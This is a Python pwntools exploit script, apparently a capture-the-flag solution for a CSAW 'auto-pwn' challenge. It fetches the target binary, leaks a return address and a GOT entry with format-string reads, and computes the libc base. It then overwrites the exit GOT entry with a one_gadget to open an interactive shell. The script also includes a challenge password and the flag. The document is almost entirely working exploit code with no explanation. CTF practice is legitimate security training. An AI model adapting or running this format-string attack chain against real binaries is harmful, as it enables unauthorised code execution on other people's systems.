from pwn import *
import sys
import os

# flag{c0ngr4tul4t10ns,4ut0-pwn3r!5h0ut0ut5_t0_UTCTF_f0r_th31r_3xc3ll3nt_AEG_ch4ll3ng3_1n_M4y}

num = 50
host = 'auto-pwn.chal.csaw.io'
port = 11000 + num
passwd = b'f24893e242786db36cb37939ad0a90ff'

# ==================================================================
def get_binary(num, passw):
    p = remote(host, port)
    p.sendline(passwd)

    line = b''
    while not line.startswith(b'-----'):
        line = p.recvline()

    file = f'hexdumps/binary_{num}.txt'
    fp = open(file, 'wb')
    line = p.recvline()
    while not line.startswith(b'-----'):
        fp.write(line)
        line = p.recvline()

    fp.close()
    p.close()
    os.system(f'xxd -r {file} binaries/chall{num}')

get_binary(num, passwd)
# sys.exit(0)

# ==================================================================
elf = ELF(f'./binaries/chall{num}')
context.binary = elf

if args.LOCAL:
    libc = ELF('libc.so.6')
    os.chdir('binaries')
    p = process([elf.path])
    os.chdir('..')
    one_gadget = 0xe6c81
else:
    p = remote(host, port)
    libc = ELF('libc6_2.31-0ubuntu9.1_amd64.so')
    one_gadget = 0xe6c81


# ==================================================================
def exec_fmt(payload):
    os.chdir('binaries')
    p = process([elf.path])
    os.chdir('..')
    p.sendline(passwd)
    p.sendline(payload)
    p.recvuntil(b'Report 1:\n')
    p.sendline(payload)
    p.recvuntil(b'Report 2:\n')
    p.sendline(b'XXXXXXX')
    return p.recvall()


# autofmt = FmtStr(exec_fmt)
# offset = autofmt.offset
offset = 8
log.info(f'Format string offset: {offset}')

p.recvuntil(b'> ')
p.sendline(passwd)

# ==================================================================
p.recvuntil(b'> ')
p.sendline(b'%35$lx')
p.recvuntil(b'Report 1:\n')

ret_addr = int(p.recvline().decode().strip(), 16)
elf.address = ret_addr - 0x15a2

# ==================================================================
func = '__libc_start_main'
payload = b'%31$s '
payload += b'X' * (184 - len(payload))
payload += p64(elf.got[func])

p.recvuntil(b'> ')
p.sendline(payload)
p.recvuntil(b'Report 2:\n')
got_leak = u64(p.recvuntil(b' X')[:-2].ljust(8, b'\x00'))
log.info(f'Leaked {func}: {hex(got_leak)}')
libc.address = got_leak - libc.symbols[func]

# ==================================================================
addr = elf.got['exit']
value = libc.address + one_gadget

log.info(f'Writing {hex(value)} at address {hex(addr)}')

payload = fmtstr_payload(offset, {addr: value}, write_size='byte')
p.recvuntil(b'> ')
p.sendline(payload)

# ==================================================================
p.interactive()
p.close()